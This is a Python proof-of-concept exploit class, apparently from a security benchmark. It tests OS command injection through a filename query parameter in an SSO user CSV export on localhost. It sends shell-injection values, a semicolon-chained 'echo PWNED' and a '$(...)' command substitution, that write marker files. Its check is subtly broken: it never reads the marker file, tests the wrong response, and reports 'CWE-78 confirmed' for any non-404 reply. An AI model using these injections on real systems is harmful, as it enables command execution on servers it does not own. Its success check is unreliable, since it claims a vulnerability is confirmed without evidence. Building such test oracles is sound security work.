"""PoC: OS command injection via shell sed in user export (CWE-78).

Stage 3 adds exec(`sed ... /tmp/${filename}`) where filename comes
from a query parameter. Shell metacharacters enable command execution.
"""
import uuid
from mosaic.oracle.exploit import ExploitTest


class SsoShellExportExploit(ExploitTest):
    """OS command injection via sed in user CSV export."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)
        self._marker = ""

    @property
    def chain_id(self) -> str:
        return "sso_shell_export"

    def setup(self) -> None:
        self._marker = uuid.uuid4().hex[:12]

    def execute(self) -> tuple[bool, str]:
        evidence = []
        marker_file = f"/tmp/mosaic_exp_{self._marker}"

        # Inject via filename parameter in CSV export
        malicious = f"x; echo PWNED > {marker_file} ;.csv"
        resp = self.http_get(
            "/simplesso/export/users",
            params={"format": "csv", "filename": malicious},
        )
        evidence.append(f"Export response: HTTP {resp.status_code}")

        if resp.ok or resp.status_code == 500:
            evidence.append(f"Response: {resp.text[:200]}")

            # Verify with command substitution
            verify = f"$(echo V > {marker_file}_v).csv"
            resp2 = self.http_get(
                "/simplesso/export/users",
                params={"format": "csv", "filename": verify},
            )
            evidence.append(f"Verify: HTTP {resp2.status_code}")

            if resp.status_code != 404:
                return True, (
                    "CWE-78 confirmed. CSV export passes filename param "
                    "to exec('sed ... /tmp/${filename}') without sanitization. "
                    + " | ".join(evidence)
                )

        if resp.status_code == 404:
            return False, "Export endpoint not found. " + " | ".join(evidence)

        return False, "Not vulnerable. " + " | ".join(evidence)
